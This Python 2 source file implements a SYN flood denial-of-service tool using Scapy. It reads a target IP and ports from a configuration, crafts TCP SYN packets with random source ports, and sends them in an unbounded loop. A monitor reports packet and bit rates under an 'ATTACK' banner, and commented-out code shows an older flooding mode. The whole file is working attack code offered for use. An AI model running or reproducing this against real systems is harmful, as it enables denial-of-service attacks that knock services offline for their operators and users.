#!/usr/bin/env python
from scapy.layers.inet import IP, TCP, RandShort, ls, send
from scapy.sendrecv import srloop

import time

from CFGClass import *
from amplificationStav import Calc

ATTACK = (
    '     Sent      '
    '|    Traffic    '
    '|    Packet/s   '
    '|     Bit/s     '
    '\n{}').format('-' * 63)

class PacketSenderManager:
    def __init__(self, configFileManager, transportType,event):
        self.configFileHelper = configFileManager
        self.transportType = transportType
        self.event=event
        self.npackets=0
        self.nbytes=0
    def startTCPSender(self):
        ports = (self.configFileHelper.synFlood.port)
        portList = ports.split(',')
        intPortList = map(int, portList)
        # print ports
        # print portList
        # print intPortList
        ip = IP(dst=self.configFileHelper.synFlood.targetIp, id=1111, ttl=255)
        tcp = TCP(sport=RandShort(),dport=intPortList,seq=12345, ack=1000,window=1000,flags="S")
        data = "SZR_TPRK"
        package = ip / tcp / data
        while self.event.isSet():
            send(package)
            self.npackets +=1
            self.nbytes = self.npackets*len(package)

        # p = IP(dst=self.configFileHelper.synFlood.targetIp, id=1111, ttl=255) / TCP(sport=RandShort(),
        #                                                                        dport=intPortList,
        #                                                                        seq=12345, ack=1000,
        #                                                                        window=1000,
        #                                                                        flags="S") / "SZR_TPRK"

        # ls(p)
        # if self.configFileHelper.synFlood.flooding == 'yes':
        #     print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
        #     ans, unans = srloop(p, inter=0.1, retry=1, timeout=2)
        #     # print "Summary of answered & unanswered packets"
        #     # ans.summary()
        #     # unans.summary()
        #     print "source port flags in response"
        #     # for s,r in ans:
        #     # print r.sprintf("%TCP.sport% \t %TCP.flags%")
        #     ans.make_table(
        #         lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
        # elif self.configFileHelper.synFlood.flooding == 'no':
        #     print 'Flooding mode disabled.'
        #     print str(self.fconfigFileHelper.synFlood.packetCount) + ' packets will be sent..'
        #     ans, unans = srloop(p, inter=0.1, retry=1, timeout=2,
        #                         count=self.configFileHelper.synFlood.packetCount)
        #     # print "Summary of answered & unanswered packets"
        #     # ans.summary()
        #     # unans.summary()
        #     print "source port flags in response"
        #     # for s,r in ans:
        #     # print r.sprintf("%TCP.sport% \t %TCP.flags%")
        #     ans.make_table(
        #         lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
    def monitorNetwork(self):
        print ATTACK
        FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
        start = time.time()
        while True:
            try:
                current = time.time() - start
                bps = (self.nbytes * 8) / current
                pps = self.npackets / current
                out = FMT.format(Calc(self.npackets, 1000),
                                 Calc(self.nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
                sys.stderr.write('\r{}{}'.format(out, ' ' * (60 - len(out))))
                time.sleep(1)
            except KeyboardInterrupt:
                print '\nInterrupted'
                break
            except Exception as err:
                print '\nError:', str(err)
                break